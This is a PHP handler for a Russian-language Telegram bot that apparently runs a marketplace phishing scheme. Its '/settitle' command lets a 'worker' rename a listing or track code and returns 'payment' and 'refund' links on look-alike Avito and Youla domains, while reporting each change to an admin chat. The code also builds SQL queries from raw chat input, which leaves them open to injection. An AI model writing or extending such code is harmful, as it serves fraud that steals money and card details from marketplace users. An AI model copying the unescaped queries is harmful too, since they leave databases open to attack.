<?php

	if(preg_match('/^\/settitle/i', $message['text']) == TRUE) {
		if(preg_match('/^\/settitle (.{24}|\d+);.+$/i', $message['text']) == TRUE) {
			$edit = explode(';', mb_substr($message['text'], 10));
			
			$adverts = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `advert_id` = '$edit[0]'");
			$trackcodes = mysqli_query($connection, "SELECT `code`, `amount`, `worker`, `product`, `status` FROM `trackcodes` WHERE `code` = '$edit[0]'");
			
			if(mysqli_num_rows($adverts) > 0 OR mysqli_num_rows($trackcodes) > 0) {
				if(mysqli_num_rows($adverts) > 0) {
					$advert = mysqli_fetch_assoc($adverts);
					
					if($advert['worker'] == $message['from']) {
						mysqli_query($connection, "UPDATE `adverts` SET `title` = '$edit[1]' WHERE `advert_id` = '$edit[0]'");
						
						$text = "➕ <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название объявления</b>\n";
						send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
						$text = "💶 <b>Вы изменили название объявлении</b>\n\n";
						
						if($advert['type'] == 0) {
							$text .= "<b>Оплата:</b> https://$domains[avito]/buy?id=$edit[0]\n";
							$text .= "<b>Возврат:</b> https://$domains[avito]/refund?id=$edit[0]";
						} elseif($advert['type'] == 1) {
							$text .= "<b>Оплата:</b> https://$domains[youla]/product/$edit[0]/buy/delivery\n";
							$text .= "<b>Возврат:</b> https://$domains[youla]/refund/$edit[0]/\n";
						}
					} else {
						$text = "📬 <b>Объявление закреплено не за вашим аккаунтом</b>";
					}
				} elseif(mysqli_num_rows($trackcodes) > 0) {
					$track = mysqli_fetch_assoc($trackcodes);
					
					if($track['worker'] == $message['from']) {
						if($track['status'] > 0) {
							mysqli_query($connection, "UPDATE `trackcodes` SET `product` = '$edit[1]' WHERE `code` = '$edit[0]' AND `worker` = '$message[from]' AND `status` > '0'");
						
							$text = "✍🏿 <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>изменил название своего трек-кода на</b> <b>на</b> <code>$edit[1]</code>\n";
							send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
							$text = "💶 <b>Вы изменили название своего трек-кода на</b> <code>$edit[1]</code>";
						} else {
							$text = "📬 <b>Трек-код ещё не обработан или уже неактивен</b>";
						}
					} else {
						$text = "📬 <b>Трек-код закреплен не за вашим аккаунтом</b>";
					}
				}
			} else {
				$text = "📬 <b>Объявление или трек-код с таким ID не было найдено</b>";
			}
			
			send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		} else {
			$text = "❔ Используйте /settitle <code>[ID объявления];[Название товара]</code>";
			send($config['token'], 'sendMessage', Array('chat_id' => $message['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		}
	}

?>